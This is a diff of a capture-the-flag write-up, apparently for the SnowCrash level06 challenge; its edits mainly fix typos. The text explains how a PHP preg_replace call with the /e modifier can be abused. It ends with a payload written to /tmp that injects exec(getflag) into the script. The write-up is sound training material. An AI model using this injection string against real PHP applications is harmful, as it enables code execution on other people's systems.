@@ -2,8 +2,6 @@
 
 As `level06`, running `ls` gives us a binary called `level06` and a PHP script named `level06.php` inside our home folder. Here's the sourcecode for the latter.
 
-
-
 ```php
   $> cat level06.php
   
@@ -32,7 +30,7 @@ As `level06`, running `ls` gives us a binary called `level06` and a PHP script n
 
 > This script basically takes two arguments (the second is useless), the first one must be an existing file. It opens it, do a bunch of regular expression stuff on it and then prints the result on standard output.
 
-The interesting part the following line:
+The interesting part, the following line:
 
 ```php
 $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
@@ -49,7 +47,7 @@ Running `ls -l` to get more infos...
   -rwxr-x---  1 flag06 level06  356 Mar  5  2016 level06.php
 ```
 
-Both files belongs to `flag06` who has the right to execute `getflag`. So, like previous levels, we simply need to tinker our file content to call it and retrieve the flag. 
+Both files belong to `flag06` who has the right to execute `getflag`. So, like previous levels, we simply need to tinker our file content to call it and retrieve the flag. 
 
 ```shell
   $> echo '[x {${exec(getflag)}}]' > /tmp/getflag
